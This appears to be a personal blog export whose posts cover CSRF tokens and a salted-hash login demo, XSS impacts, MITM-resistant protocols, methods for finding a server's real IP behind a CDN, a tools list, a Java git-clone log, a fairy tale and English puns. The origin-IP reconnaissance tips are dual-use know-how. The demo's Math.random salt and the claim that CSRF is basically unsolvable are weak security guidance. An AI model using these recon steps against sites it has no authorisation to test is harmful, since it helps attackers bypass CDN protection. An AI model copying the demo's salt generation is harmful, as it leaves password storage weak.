<li><p>请求时利用 csrf token 作为盐值， 每次请求的时候使用CsrfToken作为盐值对参数进行Md5签名，网关从请求的Cookie中取出userToken并AES解密出CsrfToken，再进行验签。用户退出或者userToken时效的时候都会主动从LocalStorage中清除CsrfToken,从cookie中清除Token和用户信息，任何需要访问用户登录态的数据因为都需要加密，所以首先会判断CsrfToken是否存在，不存在直接跳登录页了。</p>
</li>
<li><p>这样一来， 盐值不参与请求， 只是加密用</p>
</li>
<li><p>短信检测考虑成本必加时限和图片验证</p>
</li>
</ul>
</li>
<li><p>Token 可选位置</p>
<ul>
<li><p>验证 HTTP Referrer 字段；（仿盗图用也不错，但可以手工修改，所以不是好方案）</p>
</li>
<li><p>在请求地址中添加 token 并验证, 表单生成带token</p>
</li>
<li><p>在 HTTP 头中自定义属性并验证。</p>
</li>
</ul>
</li>
<li><p>总结： CSRF 难解，可以说各有利弊，换句话说差不多就是解不了</p>
</li>
<li><p><a class="link"   href="http://ju.outofmemory.cn/entry/134189" >Token 必知必会<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><a class="link"   href="http://www.ruanyifeng.com/blog/2016/04/cors.html" >Note: Ajax 同源， CORS 跨源， JSONP<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
</ul>
<h4 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a><a class="link"   href="https://my.oschina.net/u/1269381/blog/852679" >Demo<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h4><ol>
<li><p>数据结构设计： 用户数据 和 认证分开存储， 从而便于认证扩展</p>
</li>
<li><p>验证成功的token要更新</p>
</li>
<li><p>客户端加密公开， 所以要加密就加盐，让他推也难受</p>
</li>
<li><p>实例示范：</p>
</li>
</ol>
<p>浏览器主要完成以下工作： 获取用户输入的用户名及密码 通过输入的用户名和密码，进行哈希，得到浏览器端密文 将用户名和密文提交给后端</p>
<pre><code>// 密码与用户名的哈希
function encryptPwd(username, password) &#123;
  username = username.toLowerCase();
  return sha256(
    username + sha256 (
      sha256(sha256(sha256(password))) + sha256(username)
    )
  );
&#125;

$scope.login = function()&#123;
  // 检查用户名和密码的合法性，比如是否输入，长度是否足够等
  if($scope.check()) &#123;
    return;
  &#125;
  $scope.successMessage = &#39;&#39;;
  $scope.errorMessage = &#39;&#39;;
  $scope.status = &#39;loading&#39;;
  // 向后端提交登录请求
  $resource(&#39;/user/login&#39;)
  .save(&#123;
    username: $scope.username,
    password: encryptPwd($scope.username, $scope.password)
  &#125;, function(res)&#123;
    $scope.status = &#39;done&#39;;
    $scope.successMessage = &#39;login successful!&#39;;
  &#125;, function(reason)&#123;
    $scope.status = &#39;done&#39;;
    $scope.errorMessage = reason.data || &#39;failed&#39;;
  &#125;);
&#125;;
</code></pre>
<p>后端验证： 获取前端提交的用户名及浏览器端密文 根据用户名，在数据库中查询出对应的盐 id 通过盐 id 取出对应的盐，再通过用户名、浏览器端密文和盐算出后端密文 根据用户名和后端密文到用户表查询，如果有结果，则表明登录信息正确，返回给浏览器登录成功的响应 生成新的盐，算出新的后端密文，并将两者更新到数据库中</p>
<pre><code>function encryptPwd(usr, pwd, salt)&#123;
  usr = usr.toLowerCase();
  return sha256(
    sha256(usr + sha256(pwd + salt)) + salt + sha256(usr + salt)
  )
&#125;

function login(req, res, next)&#123;
  // 用户名密码获取和检查已省略
  // 根据用户名，获取盐 id
  req.models.user
  .findOne(&#123;select:[&#39;username&#39;, &#39;saltId&#39;], where: &#123;username: username&#125;&#125;)
  .exec(function(err, userDoc)&#123;
    if(err) return next(err);
    if(!userDoc) return next(new Error(&#39;username not exists&#39;));

    // 取盐
    req.models.salt
    .findOne(&#123;id: userDoc.saltId&#125;)
    .exec(function(err, saltDoc)&#123;
      if(err) return next(err);
      if(!saltDoc) return next(new Error(&#39;can NOT find salt&#39;));

      // 根据用户名、密码和盐推算出密文
      var pwdHash = encryptPwd(username, password, saltDoc.salt);
      // 在数据库中核对用户名和密文
      req.models.user
      .findOne(&#123;select: [&#39;id&#39;], where: &#123;username: username, password: pwdHash &#125;&#125;)
      .exec(function(err, doc)&#123;
        if(err) return next(err);
        if(!doc) return next(new Error(&#39;password error&#39;));

        res.json(&#123;
          username: username
        &#125;);

        return updateSalt(saltDoc, userDoc, password, next);
      &#125;);
    &#125;);
  &#125;);
&#125;
</code></pre>
<p>前面返回给用户成功登录的响应之后，调用了更新盐和密文的方法，该方法具体流程如下： 生成并存储新盐 根据新盐、用户名和浏览器端密文，生成新的后端密文 存储后端密文到用户信息表</p>
<pre><code>function updateSalt(saltDoc, userDoc, passwordInputed, next)&#123;
  saltDoc.salt = Math.random().toString(15).substr(3, 27);
  saltDoc.save(function(err)&#123;
    if(err) return next(err);
    userDoc.password = encryptPwd(userDoc.username, passwordInputed, saltDoc.salt);
    userDoc.save(function(err)&#123;
      if(err) return next(err);
      return next();
    &#125;);
  &#125;);
&#125;
</code></pre>
<p>数据存储这块，使用了 Waterline 这个 ORM 中间件使用它的目的主要是为了将用户信息和盐存储到不同的地方。本例中将盐用 sails-disk 存储到了文件中，用户信息用 sails-mongo 存储到了 MongoDB 中。</p>
<h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><ol>
<li><a class="link"   href="http://www.freebuf.com/articles/web/39234.html" >XSS &amp; CSRF , SSRF 不考虑<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ol>
<ul>
<li><p>盗用 cookie ，获取敏感信息。</p>
</li>
<li><p>利用植入 Flash ，通过 crossdomain 权限设置进一步获取更高权限；或者利用Java等得到类似的操作。</p>
</li>
<li><p>利用 iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</p>
</li>
<li><p>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</p>
</li>
<li><p>在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。</p>
</li>
<li><p>防御： 过滤； Http制定头类型， 避免被解析为html</p>
</li>
</ul>
<ol>
<li>TLS MITM 这玩意能解?</li>
</ol>
<p>参考链接： <a class="link"   href="https://www.zhihu.com/question/20744215" >https://www.zhihu.com/question/20744215<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   href="https://www.v2ex.com/t/161520" >https://www.v2ex.com/t/161520<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<ul>
<li><p>一般能防MITM的要具有以下特征： 1、握手加密而且具有可信CA（SSL、TLS之类，CNNIC和WoSign就不点评了）或拥有预协商密钥（L2TP） 2、加密方法足够强大（AES、CHACHA20之类，RC4和SM2就不点评了）</p>
</li>
<li><p>综上，一般情况下，以下的协议是安全的： 1、HTTPS（排除RC4、3DES算法，排除CNNIC、WoSign的CA证书） 2、OpenVPN（基于TLS，只要你能连上就是安全的） 3、L2TP _Over IPSec_（必须要Over IPSec，没了就没加密了） 4、IKEv2（基于TLS和可信CA发的证书，安全性比OpenVPN还好） 5、SSTP（基于TLS和可信CA发的证书，安全性和IKEv2相同，稳定性加强，用443端口） 6、ShadowSocks（基于N+1种加密算法，只要你不选RC4或RC4-MD5算法就是安全的）</p>
<p>  7、任何用SSL Stream过又验证CA甚至客户端证书的TCP连接（UDP大家都懂，DNS什么的）</p>
</li>
</ul>
<h1 id="CDN-to-Real-IP"><a href="#CDN-to-Real-IP" class="headerlink" title="CDN to Real IP"></a>CDN to Real IP</h1><ol>
<li><p>First let us know about cdn. <strong>The next content list as follows from wiki.</strong></p>
<blockquote>
<p>A <strong>content delivery network</strong> or <strong>content distribution network</strong> (CDN) is a globally distributed network of proxy servers deployed in multiple<br>data centers. The goal of a CDN is to serve content to end-users with<br>high availability and high performance. CDNs serve a large fraction of<br>the Internet content today, including web objects (text, graphics and<br>scripts), downloadable objects (media files, software, documents),<br>applications (e-commerce, portals), live streaming media, on-demand<br>streaming media, and social networks. The term CDN means many things to different people and is an umbrella<br>term that covers a lot of different types of content delivery<br>services. Video streaming, software downloads, web and mobile content<br>acceleration, licensed&#x2F;managed CDN, transparent caching, and services<br>to measure CDN performance, load balancing, multi-CDN switching and<br>analytics and cloud intelligence. It’s a complex ecosystem with a lot<br>of vendors both large and small and some CDN vendors cross over into<br>other industries like security and WAN optimization.[1] Content owners such as media companies and e-commerce vendors pay CDN<br>operators to deliver their content to their end-users. In turn, a CDN<br>pays ISPs, carriers, and network operators for hosting its servers in<br>their data centers.</p>
</blockquote>
</li>
<li><p>How to get the CDN service?<br>At home, you can try to use <strong>baidu CloudSpeed</strong> which is free.<br>just check the info and change the dns as it provide on your domain register site.<br>but if you were not in China, you can see this link <a class="link"   href="http://www.wpexplorer.com/free-cdn-services-for-wordpress/" >Ten free cdn for wordpress<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p>Here the question come:<br>How could we get the real ip of the server instead of cdn?</p>
<ul>
<li>let us try ping it, actually we know that ping may not work for the without www child domain, so you should ping like <strong>xxx.cn</strong> not <strong><a class="link"   href="http://www.xxx.cn/" >www.xxx.cn<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong>.This because many operators did not provide the www cdn service.</li>
<li>since we mention the second-level domain, you should try all the possible child domain.(whatever the way you choose, alexa , chinaz, or any tool could brute force… )</li>
<li><strong>find the history</strong> (How about <a class="link"   href="http://netcraft.com/" >netcraft.com<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)(<strong>espically this way, I found the target Ip from <a class="link"   href="http://site.ip138.com/" >ip138 history<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong>)</li>
<li>still ping, but with vpn or any foreign proxy.</li>
<li>guess the <code>phpinfo</code> （It seems seek far and neglect what lies close at hand, anyway it is a good idea.）</li>
<li>The last but effective significantly method is e-mail. For example, you can register account on the target site. Most of them will send you an email to you. You can check the real content in it to find its real IP.</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>security</tag>
        <tag>csrf</tag>
        <tag>login</tag>
        <tag>session</tag>
        <tag>token</tag>
        <tag>uid</tag>
        <tag>web</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>Win Userful Tools</title>
    <url>/2018/04/04/win-userful-tools/</url>
    <content><![CDATA[<ol>
<li><p>Markdown edit</p>
<ul>
<li>Typora</li>
<li>Atom</li>
<li>VS code</li>
</ul>
</li>
<li><p>IDE</p>
<ul>
<li>Idea</li>
<li>Pycharm</li>
<li>Android Studio</li>
<li>CodeBlocks， VS， Clion</li>
<li>Racket</li>
</ul>
</li>
<li><p>Screen Shot</p>
<ul>
<li>Snipaste</li>
<li>Screen2Gif</li>
</ul>
</li>
<li><p>Browser  </p>
<ul>
<li>Firefox development </li>
<li>Chrome</li>
</ul>
</li>
<li><p>Version control</p>
<ul>
<li>git (without GUI)</li>
</ul>
</li>
<li><p>Instant Messaging</p>
<ul>
<li>Tim</li>
<li>Telegram</li>
</ul>
</li>
<li><p>PDF reader</p>
<ul>
<li>Jiusu PDF</li>
</ul>
</li>
<li><p>Penetration test tool</p>
<ul>
<li>VMware</li>
<li>Kali iso</li>
<li>Nmap</li>
<li>Wireshark</li>
<li>Fiddler</li>
<li>HEX Editor</li>
<li>X96 DBG</li>
<li>Xshell</li>
<li>Burpsuit</li>
<li>Acunetix</li>
<li>Nessus</li>
</ul>
</li>
<li><p>Video player</p>
<ul>
<li>ACG player</li>
<li>Pot player</li>
</ul>
</li>
<li><p>Effective tool</p>
<ul>
<li>Listary</li>
<li>Sharex [poor ui]</li>
<li>Everything [poor ui]</li>
<li>Wox [Need Everything]</li>
</ul>
</li>
<li><p>Team</p>
<ul>
<li>TeamViewer</li>
</ul>
</li>
<li><p>Music Player</p>
<ul>
<li>NetEase Cloud</li>
</ul>
</li>
<li><p>Input method</p>
<ul>
<li>Win10 Microsoft</li>
</ul>
</li>
<li><p>Download</p>
<ul>
<li>Baiduyun</li>
</ul>
</li>
<li><p>Draw and diagram</p>
<ul>
<li>Photoshop</li>
<li>Process on</li>
</ul>
</li>
<li><p>Disk no sleep U maybe need this if your PC was plugged in another disk on the CD ROM position.</p>
</li>
<li><p>Database</p>
<ul>
<li>Navicat</li>
<li>Data Grip</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
      <tags>
        <tag>effective</tag>
        <tag>tools</tag>
        <tag>win10</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>ZIT development log</title>
    <url>/2021/02/10/zit/</url>
    <content><![CDATA[<h1 id="ZIT-development-log"><a href="#ZIT-development-log" class="headerlink" title="ZIT development log"></a><a class="link"   href="https://github.com/ReZeroS/zit" >ZIT<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> development log</h1><p>Thanks for the great tutorial: <a class="link"   href="https://www.leshenko.net/p/ugit" >https://www.leshenko.net/p/ugit<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>Thanks again Nikita!</p>
<h2 id="Resource"><a href="#Resource" class="headerlink" title="Resource"></a>Resource</h2><p>I found some good reference material, and I put them under the <code>./doc</code> directory.</p>
<p>Besides, the follow links maybe help you too.</p>
<ul>
<li><a class="link"   href="http://simplygenius.net/Article/DiffTutorial1" >Nick Butler<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> this post is short but enough to help you have a higher level to understand diff</li>
<li><a class="link"   href="https://blog.jcoglan.com/2017/02/12/the-myers-diff-algorithm-part-1/" >jcoglan<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> this posts make a detail description about the diff.</li>
<li><a class="link"   href="https://blog.robertelder.org/diff-algorithm/" >visualize<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> if you wanna have a debugger or visualization about diff algorithm, this will be a good choice.</li>
</ul>
<p>If you feel interested about this project, you can post your idea on the discussion or just contact me with email.</p>
<h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><ol start="0">
<li><p><code>alias zit=&#39;java -jar ../zit-1.0-SNAPSHOT-shaded.jar&#39;</code> alias the zit executable file.</p>
<ul>
<li>windows could set here <code>C:\Program Files\Git\etc\profile.d\aliases.sh</code></li>
</ul>
</li>
<li><p><code>zit init</code> init directory <code>.zit</code> which include <code>objects</code> subdirectory, init index file which would be treated as stage area, and set <code>main</code> branch as default to prevent detached head</p>
<ul>
<li>the default HEAD file content is <code>ref: ref/heads/main</code></li>
</ul>
</li>
<li><p><code>zit hash-object file</code></p>
<ul>
<li>Get the path of the file to store.</li>
<li>Read the file.</li>
<li>Hash the <em>content</em> of the file using SHA-1.</li>
<li>Store the file under <code>.ugit/objects/&#123;the SHA-1 hash&#125;</code>.</li>
</ul>
</li>
<li><p><code>zit cat-file hash [object|tree|commit|...type]</code> print the file content</p>
</li>
<li><p><code>zit write-tree</code> generate the tree which is the whole description of the repository.</p>
<ul>
<li>after finished <code>add</code> command, it will write tree which is generated by index file</li>
</ul>
</li>
<li><p><code>zit read-tree hash</code></p>
<ul>
<li>pay attention！this action will delete all existing stuff before reading.</li>
<li>So you can use <code>cat-file</code> to find which tree is the <code>root</code>, and the logs of <code>write-tree</code> also help you find all the trees.</li>
</ul>
</li>
<li><p>Although <code>write-tree</code> can save version, but it does not take any context information, so will need to develop <code>zit commit -m &quot;message&quot;</code> command.</p>
<ul>
<li>you can use <code>cat-file hash commit-id</code> to check your commit content</li>
<li><code>HEAD</code> will record your commit with its parent.</li>
</ul>
</li>
<li><p>Just enjoy commit and the type <code>log</code> to see the logs.</p>
</li>
<li><p>Now we get the first point: <code>checkout</code>. Pick a commit id from the <code>log</code> and checkout whether things as expected.</p>
<ul>
<li>[fixed with getBytes(Charsets.UTF-8)] find bug todo: chinese file or dir name got messy code</li>
<li>args could be head alias, hash and ref(branch, tags, HEAD…)</li>
</ul>
</li>
<li><p><code>tag</code> will alias commit id, and at this time, you will get first inner core concept.</p>
<ul>
<li><a class="link"   href="https://git-scm.com/book/en/v2/Git-Internals-Git-References" >git-ref<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> the official post will help you learn some basic knowledge about the git.</li>
</ul>
</li>
<li><p>todo: <code>zit lg</code> graph feature with Graphviz</p>
</li>
<li><p><code>zit branch name [id]</code> so familiar.</p>
<ul>
<li>Every ref under refs&#x2F;heads will be treated as a branch.</li>
<li>file content still just commit id, by default it is the head point</li>
</ul>
</li>
<li><p><code>zit show</code> will use diff show changes detail while status only show simply changes info.</p>
</li>
<li><p><code>zit add</code> will add paths which could be file or directory into stage file: <code>.zit/index</code>.</p>
</li>
<li><p><code>zit commit</code> will call <code>write tree</code> and update head pointer to the commit id.</p>
<ul>
<li>first time it will create default branch: <code>main</code> and will rewrite the HEAD file content to the commit id</li>
<li>the merge HEAD will be deleted and leave the message into commit message</li>
</ul>
</li>
<li><p><code>zit status</code> this command will tell you what is the situation you are in now.</p>
<ul>
<li>if you are not detached HEAD, it will log your current HEAD pointed branch first,</li>
<li>after that, if you are working in merge, it will log the merge hash id,</li>
<li>then it will log changes to be committed which will diff head tree to index(stage items),</li>
<li>finally, it will log changes not staged for the next commit which diff index(stage) to work tree.</li>
</ul>
</li>
<li><p><code>zit diff</code> the default diff algorithm is myers diff without linear space refinement optimized</p>
</li>
<li><p><code>zit reset</code> just change head to the current commit, the difference between it and <code>checkout</code> is the  &#x2F;&#x2F; todo</p>
</li>
<li><p><code>zit merge</code> will check if the merge base equals the head, it will use fast-forward to merge</p>
<ul>
<li>if fast-forward work, it will be no need to commit</li>
<li>if not work, we will use diff3 merge to merge the <strong>merge base</strong>, <strong>head tree</strong>, <strong>other tree</strong></li>
<li>pay attention: diff3 will leave merge_head in the zit root directory and that means you need to commit manually.</li>
<li><code>zit merge-base</code> is used to help the merge command find the first common parent commit of the commits which will be merged. But you also can use this command to do debug task.</li>
</ul>
</li>
<li><p><code>zit fetch</code>, <code>zit push</code> these two combined commands are used to download or upload objects and update the ref.</p>
</li>
</ol>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><h3 id="UPDATED-2021-02-21"><a href="#UPDATED-2021-02-21" class="headerlink" title="UPDATED 2021.02.21"></a>UPDATED 2021.02.21</h3><ul>
<li><p>implemented the diff(myers diff but without linear space optimized) and merge algorithms(simple diff3) instead of using unix tools.</p>
</li>
<li><p><code>Ugit</code> use some cool <code>Pythonic</code> code while zit trying to make code easy understood for the other language developer.</p>
</li>
</ul>
<h3 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h3><ol>
<li>git hash-object todo. When real Git stores objects it does a few extra things, such as writing the size of the object to the file as well, compressing them and dividing the objects into 256 directories. This is done to avoid having directories with huge number of files, which can hurt performance.</li>
</ol>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>2016.11.12</title>
    <url>/2016/11/13/wechat-publosher/</url>
    <content><![CDATA[<p>生来多病<br>把以前公众号写的小故事上一下吧 公主殿下 原创 2016-05-06 西瓜可乐不加冰</p>
<blockquote>
<p>公主殿下 Finding my secret garden  “孤独这两个字拆开看，有小孩，有水果，有走兽，有蚊蝇，足以撑起一个盛夏傍晚的巷子口，人味十足。” 南国的边界上有一种花，名为难遇。这种花聚集在一个地方，每一百年出现一次。每天早上吸第一颗晨露，沐第一束阳光，保持常青，不会枯萎。但花的周围有一圈湖水，只有单纯的小孩子才能走过去。 老国王年轻的时候爱上了邻国的公主，但是他不知道怎么追女孩。于是他每天早上都会去邻国的边界采一朵花，在公主还没起床的时候放在她的窗外。 可是有一天，他在去邻国的路上遇见了一只恶龙，恶龙高大，魁ke梧ai，还有点凶dai狠meng。恶龙喘息着，散发着王者的威严，它命令道：<br>“留下棒棒糖，不然我吃掉你。”国王吓坏了，于是打晕了恶龙逃跑了。 可是后来恶龙每次都会出现在那条道路上，但每次都被国王打晕，终于恶龙忍无可忍，去学习了强大的魔法。这天恶龙找到了国王，对国王说：“我们合作吧。”于是国王屁颠屁颠的跑回去了。 傍晚的时候，邻国的公主对着窗外发呆，他怎么不来了呢？公主叹息了一声，转过身，只觉着眼前一黑，昏了过去。 醒来的时候公主发现自己在一个黑暗的洞穴里，前面一只巨龙背对着她仿佛在咀嚼什么东西。巨龙似乎是发觉了，回过身，把棒棒糖藏在了身后，然后一脸懵逼的看着公主。 公主害怕极了，对恶龙喊道：“我可是大邻王朝的公主，你要是敢把我放在这么丑的地方我一定会告诉我父王！”恶龙听了十分生气，于是公主打晕了恶龙逃跑了。 公主跑出山洞的时候，看到了拿着剑的国王，国王也看到了公主，顿时一脸懵逼。公主看着王子，耳后根瞬间红透了，于是坚定地对王子说：“你嫁给我吧。”国王答应着，马上意识到有哪不对，但很快就被公主装进麻袋带走了。 “所以爸比你是下嫁给妈咪的么？”两颗水灵灵的大眼珠呆呆的看着国王，好奇地问着他。 这是刚满六岁的小公主。 今天是她生日，国王开心的给她讲自己年轻时的英勇事迹。宴会上，国王说等宴会结束要送给公主一件礼物。 公主很好奇，于是把礼物偷了出来。 “好大的鸡蛋，这是要吃水煮鱼的节奏么？！”公主的脑洞瞎补着。 “蠢货，瞧你那傻样！” 蛋壳裂开了，露出了一只红色的小尾巴，朝着公主， 放了个屁儿。。。 公主还没回过神来，又一个屁儿~~ ，这次公主懵了一下后，狠狠地把蛋摔了~~ 这边的国王在四处左右张望着，心里碎碎念着，我五打棒棒糖骗来的蛋呢？ ······ 公主七岁了，喜欢上了看动画片，这天不知抽什么疯，对着天空大喊：“我要当龙骑士！” 小龙白了她一眼：“好好好，我背你。” 小龙的个头还是不长，公主却十三岁了，小龙看着公主的样子，越发的可爱动人，终于有一天，小龙鼓起勇气，对公主说：“大婶，等我长大了，我可以娶你么？”<br>公主温柔的一笑：“你要是再敢这么叫，我就惩戒死你。”小龙害怕极了，于是吐火烧了她一半的头发。<br>“公主，你短发的样子真好看。”“闭嘴，别以为这样老娘就会放过你！” 终于小龙也开始长大了，个子一天天高起来，公主漂亮的披肩长发也开始焕发着新的光芒。 这天公主看到小龙，好奇地问：“丑货，你在干啥？”<br>小龙不抬头，只是回复了一声，“我在搭建一座大小合适的城堡。”然后继续忙着自己的工作。<br>公主看着小龙的专注的样子，不禁犯起了花痴，“不行不行，我怎么能喜欢上一只龙！”公主的心里偷偷地嘀咕着。<br>小龙突然抬起头，一脸呆萌的问公主：“你刚才叫我什么？”公主的脸颊泛红，迟疑了一声“嗯？”于是公主的短发又回来了。</p>
</blockquote>
<p>我只是想写完这个故事，也不知道会不会有人喜欢这样的故事，这是初稿，以后还会返修，最终稿会再发一次。<br>龙与少年公主都齐了，接下来出场的是什么样的王子和骑士，其实我已经说了答案。<br>如果有人喜欢的话欢迎说说你的想法~~~～(￣▽￣～)(～￣▽￣)～<br>ps：毕竟写故事次数很少，文笔太low多包涵，我努力在做了。三c⌒っﾟДﾟ)っ</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20161114232011063"
                      alt="这里写图片描述"
                ></p>
<p>路尽隐香处，<br>飘然雪海间。</p>
<p><a class="link"   href="http://mp.weixin.qq.com/s?__biz=MzA5NDc1ODg0MQ==&mid=2650332970&idx=1&sn=dceff06d67a149a88a28f90ddc2b5600&scene=4#wechat_redirect" >http://mp.weixin.qq.com/s?__biz&#x3D;MzA5NDc1ODg0MQ&#x3D;&#x3D;&amp;mid&#x3D;2650332970&amp;idx&#x3D;1&amp;sn&#x3D;dceff06d67a149a88a28f90ddc2b5600&amp;scene&#x3D;4#wechat_redirect<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   href="http://mp.weixin.qq.com/s?__biz=MzA5NDc1ODg0MQ==&mid=2650333036&idx=1&sn=d860328cbaf623e60f737e12768751f1&scene=4#wechat_redirect" >http://mp.weixin.qq.com/s?__biz&#x3D;MzA5NDc1ODg0MQ&#x3D;&#x3D;&amp;mid&#x3D;2650333036&amp;idx&#x3D;1&amp;sn&#x3D;d860328cbaf623e60f737e12768751f1&amp;scene&#x3D;4#wechat_redirect<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   href="http://mp.weixin.qq.com/s?__biz=MzA5NDc1ODg0MQ==&mid=2650333143&idx=1&sn=f7fb29f405908d08ec912b1f20531272&scene=4#wechat_redirect" >http://mp.weixin.qq.com/s?__biz&#x3D;MzA5NDc1ODg0MQ&#x3D;&#x3D;&amp;mid&#x3D;2650333143&amp;idx&#x3D;1&amp;sn&#x3D;f7fb29f405908d08ec912b1f20531272&amp;scene&#x3D;4#wechat_redirect<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   href="http://mp.weixin.qq.com/s?__biz=MzA5NDc1ODg0MQ==&mid=402482279&idx=1&sn=9945cf1f15fa825908c8ed6b9ff190d7&scene=4#wechat_redirect" >http://mp.weixin.qq.com/s?__biz&#x3D;MzA5NDc1ODg0MQ&#x3D;&#x3D;&amp;mid&#x3D;402482279&amp;idx&#x3D;1&amp;sn&#x3D;9945cf1f15fa825908c8ed6b9ff190d7&amp;scene&#x3D;4#wechat_redirect<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   href="http://mp.weixin.qq.com/s?__biz=MzA5NDc1ODg0MQ==&mid=2650333018&idx=1&sn=333af7e367d46de13e3ec8d5d94b8365&scene=4#wechat_redirect" >http://mp.weixin.qq.com/s?__biz&#x3D;MzA5NDc1ODg0MQ&#x3D;&#x3D;&amp;mid&#x3D;2650333018&amp;idx&#x3D;1&amp;sn&#x3D;333af7e367d46de13e3ec8d5d94b8365&amp;scene&#x3D;4#wechat_redirect<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   href="http://mp.weixin.qq.com/s?__biz=MzA5NDc1ODg0MQ==&mid=2650333188&idx=1&sn=b3d6f9c0753860cd7c75867b5f2066a4&scene=4#wechat_redirect" >http://mp.weixin.qq.com/s?__biz&#x3D;MzA5NDc1ODg0MQ&#x3D;&#x3D;&amp;mid&#x3D;2650333188&amp;idx&#x3D;1&amp;sn&#x3D;b3d6f9c0753860cd7c75867b5f2066a4&amp;scene&#x3D;4#wechat_redirect<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <a class="link"   href="http://mp.weixin.qq.com/s?__biz=MzA5NDc1ODg0MQ==&mid=2650333262&idx=1&sn=2dd0a980bd6585cd816ceed32ea06fb0&scene=4#wechat_redirect" >http://mp.weixin.qq.com/s?__biz&#x3D;MzA5NDc1ODg0MQ&#x3D;&#x3D;&amp;mid&#x3D;2650333262&amp;idx&#x3D;1&amp;sn&#x3D;2dd0a980bd6585cd816ceed32ea06fb0&amp;scene&#x3D;4#wechat_redirect<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="http://mp.weixin.qq.com/s?__biz=MzA5NDc1ODg0MQ==&mid=2650333279&idx=1&sn=1f2fce923f55bba0dbadbc507eca1ab4&scene=4#wechat_redirect" >http://mp.weixin.qq.com/s?__biz&#x3D;MzA5NDc1ODg0MQ&#x3D;&#x3D;&amp;mid&#x3D;2650333279&amp;idx&#x3D;1&amp;sn&#x3D;1f2fce923f55bba0dbadbc507eca1ab4&amp;scene&#x3D;4#wechat_redirect<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="English-fun"><a href="#English-fun" class="headerlink" title="English fun"></a>English fun</h2><ol>
<li><pre><code> Can you can a can like a canner cans a can?
 “情态动词-能”、“动词-开罐”、“名词-罐头”
 Can（能） you can（开罐） a can（罐头） 
 like a canner cans（开罐） a can（罐头）?
 “你能像一个装罐工人那样开一个罐头吗？”
</code></pre>
</li>
<li><p><code>Smell smelly. Taste tasty.   “闻着臭，吃着香”</code></p>
</li>
<li><pre><code>  two to two to two two   
 
     描述的是一个时间区间：
     1:58--2:02，
     two to two是“两点差两分”，
     two two是“两点零二分”，
     第二个那个to是介词“至、到”，
</code></pre>
</li>
<li><pre><code> Real eyes realize real lies. 
 “好眼力识破真谎言”。
 
 这句话读起来的感觉就像：
 “realize~realize~realize”
 首先real eyes中，l+e产生连读；
 其次real lies，两个l只发一个音即可。
</code></pre>
</li>
<li><pre><code> My brain has two parts, 
 the left has nothing right, 
 and the right has nothing left.
 
 left除了“左边的”的意思，还有“剩下的”意思；
 right除了“右边的”的意思，还有“正确的”的意思。
 “the left has nothing right”和
 “the right has nothing left”形成一个对仗，
 
 “左边的部分没有正确的东西，
 右边的部分没有剩下的东西”。
</code></pre>
</li>
<li><pre><code> If I could, I would, but I can’t, so I shan’t. 
